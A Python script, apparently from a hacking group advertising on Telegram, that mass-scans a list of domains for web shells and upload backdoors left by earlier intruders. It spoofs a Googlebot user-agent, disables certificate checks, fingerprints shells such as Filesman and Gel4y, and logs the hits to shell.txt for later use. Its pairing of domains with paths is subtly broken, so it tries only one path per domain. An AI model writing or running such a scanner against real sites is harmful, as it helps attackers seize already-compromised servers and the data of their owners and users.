#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import os
import socket
import sys
import random
import time
from colorama import init, Fore
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from multiprocessing.dummy import Pool


if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")
if os.name== "nt": 
    os.system("title Team Bads Security Researchers - Telegram : @h0rn3t_sp1d3r")
else:
    sys.stdout.write("Team Bads Security Researchers - Telegram : @h0rn3t_sp1d3r")

warnings.simplefilter('ignore', InsecureRequestWarning)



def banner():
    
    g = """
    ░█████╗░███╗░░░███╗░██████╗░  ██████╗░░█████╗░████████╗
    ██╔══██╗████╗░████║██╔════╝░  ██╔══██╗██╔══██╗╚══██╔══╝
    ██║░░██║██╔████╔██║██║░░██╗░  ██████╦╝██║░░██║░░░██║░░░
    ██║░░██║██║╚██╔╝██║██║░░╚██╗  ██╔══██╗██║░░██║░░░██║░░░
    ╚█████╔╝██║░╚═╝░██║╚██████╔╝  ██████╦╝╚█████╔╝░░░██║░░░
    ░╚════╝░╚═╝░░░░░╚═╝░╚═════╝░  ╚═════╝░░╚════╝░░░░╚═╝░░░

                    FROM VIP UNIQUE TOOLS 
           POWERFULL SHELLS FINDER 2500+ PRIVATE PATH 
                DEVELOPED BY H0RN3T SP1D3RS
         TELEGRAM: https://t.me/h0rn3t_sp1d3r

    """
    print(g)


banner()


def check_file(url, line):
    try:
        check = requests.get(url + line, headers={'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'}, verify=False, timeout=30)
        if 'input class="Input" type="file" name="file_n[]"' in check.content.decode("utf-8") or 'input name=" Exploit Donefile" type="file"' in check.content.decode("utf-8") or 'input type="submit" value="LOAD"' in check.content.decode("utf-8") or  'input name="_upl" type="submit" id="_upl" value="Upload"' in check.content.decode("utf-8") or  '<title>Gel4y Mini Shell</title>' in check.content.decode("utf-8") or '<title>Upload files...</title>' in check.content.decode("utf-8") or  'drwxr-xr-x' in check.content.decode("utf-8") or '<input type="password" name="password">' in check.content.decode("utf-8") or  'Filesman' in check.content.decode("utf-8") or '<input type="submit" name="test" value="Upload" />' in check.content.decode("utf-8") or '<span>Upload file:' in check.content.decode("utf-8") or 'type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8") or  '<input type=password name=pass' in check.content.decode("utf-8") or 'name="uploader" id="uploader">' in check.content.decode("utf-8") :
            print(url + Fore.GREEN + ' ' + '--> Successful' + Fore.WHITE)
            open('shell.txt', 'a').write(url + line + "\n")
        
        else:
            print(url + Fore.RED + ' ' + '--> Failed' + Fore.WHITE)
    except :
         pass


def delete_duplicates():
    try:
        with open('shell.txt', 'r') as shinxx:
            shinxxx = list(dict.fromkeys(shinxx.read().splitlines()))
            with open('shell.txt.tmp', 'a') as new:
                new.write('\n'.join(shinxxx))
                new.close()
            shinxx.close()
        os.remove('shell.txt')
        os.rename('shell.txt.tmp', 'shell.txt')
    except FileNotFoundError:
        print(Fore.RED +"shell.txt not found")


import zipfile

def main():
    try:
        domain_list = input("\nDomain List: ")
        che = open(domain_list, 'r').read().splitlines()

        with zipfile.ZipFile('Files.zip', 'r') as zip_file:  # Replace 'example.zip' with your actual zip file path
            with zip_file.open('Files/.pt.txt', 'r') as pt_file:
                pt_lines = [line.decode().strip() for line in pt_file.readlines()]

        pp = Pool(50)
        pp.starmap(check_file, zip(che, pt_lines))
    except:
        pass



if __name__ == '__main__':
    main()
    delete_duplicates()
